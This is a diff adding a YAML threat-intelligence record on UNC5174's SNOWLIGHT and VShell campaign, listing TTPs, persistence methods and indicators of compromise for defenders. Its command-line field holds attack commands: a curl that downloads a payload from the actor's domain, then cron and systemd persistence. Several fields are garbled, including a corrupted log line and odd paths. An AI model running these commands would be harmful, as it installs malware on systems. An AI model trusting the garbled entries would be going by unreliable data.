@@ -1,0 +1,89 @@
+description: This report details a campaign attributed to UNC5174, a Chinese state-sponsored
+  threat actor, utilizing SNOWLIGHT (a custom dropper) and VShell (an open-source
+  Chinese RAT). The campaign leverages WebSockets for command and control and employs
+  fileless techniques to evade detection.
+date: '2025-04-25'
+authors:
+- Sysdig Threat Research Team
+- Alessandra Rizzo
+attribution:
+  threat_actor: UNC5174
+  apt_group: SNOWLIGHT
+  country: China
+malware_families:
+- SNOWLIGHT
+- VShell
+TTPs:
+  processes:
+  - '[kworker/0:2]'
+  - memfd
+  - kworker
+  commandline:
+  - curl -sL "http://gooogleasia.com:8080/download_$executable" -o "/tmp/$executable"
+  - chmod +x /tmp/$executable
+  - crontab -l 2>/dev/null
+  - (crontab -l 2>/dev/nullecho "@reboot /usr/bin/$executable1"echo "@reboot /usr/bin/$executable2"echo
+    "0 * * * * /tmp/$executable1"echo "0 * * * * /tmp/$executable2")
+  - systemctl daemon-reload
+  - systemctl enable $executable.service
+  - systemctl start $executable.service
+  - ./vshell_linux_amd642023/67/31 16:21:41.474 (11IJEY| N\\VAZN T\\WANVA |2023/07/31
+    16:21:41.780 [I] server start, the bridge type is kcp, the bridge port is 8024
+  - 2023/07/31 16:21:41.803 [I] server start, the bridge type is tcp, the bridge port
+    is 8024
+  - '2023/07/31 16:21:41.803 [I] tunnel task start mode: httpHostServer port 8082'
+  - 2023/07/31 16:21:41.803 [I] web management start, access port is 8082
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: dnsloger
+    destination: vs.gooogleasia.com
+    port: '8080'
+  - executable: system_worker
+    destination: sex666vr.com
+    port: ''
+  - executable: system_worker
+    destination: gooogleasia.com
+    port: ''
+  - executable: vshell_linux_amd642023
+    destination_address: a.o.com
+    port: '8082'
+  file_modifications:
+  - /tmp/log_de.log
+  - /usr/bin/$executable1
+  - /usr/bin/$executable2
+  - /etc/systemd/system/$executable.service
+  - /\\A\\/sysdig -+
+  persistence:
+  - crontab entries (@reboot and hourly)
+  - systemd service creation
+  - WebSockets for command and control
+  pipes: ''
+  process_relations: ''
+IOCs:
+- hash: c0838b1211d482d21ccb2c9cc9fb224d1f826474d496a76d21ca18fa2ef92bc1
+  description: SHA256 hash of download_backd.sh
+- hash: e6db3de3a21debce119b16697ea2de5376f685567b284ef2dee32feb8d2d44f8
+  description: SHA256 hash of dnsloger
+- hash: 21ccb25887eae8b17349cefc04394dc3ad75c289768d7ba61f51d228b4c964db
+  description: SHA256 hash of system_worker
+- domain: gooogleasia.com
+- domain: sex666vr.com
+- domain: googlespays.com
+- domain: telegrams.icu
+- domain: huionepay.me
+- domain: c1oudf1are.com
+- ip: 34.96.239.183
+  description: IP address resolving to gooogleasia.com (Google Compute Engine)
+- ip: 34.96.252.230
+- ip: 34.91.68.192
+- md5: 96f307b0ba3bb11715fab5db8d61191f
+- url: https://send.now/fljiIm1v36
+- domain: gooogleasia.con
+- file_path: /kworker/:2
+- github_url: https://pkg.go.dev/github.com/bishopfox/sliver/protobuf
+- github_url: https://www.bilibili.com/video/BVIVwA11t78a
+reference: https://sysdig.com/blog/unc5174-chinese-threat-actor-vshell/
+file_creation_date: May 14, 2025
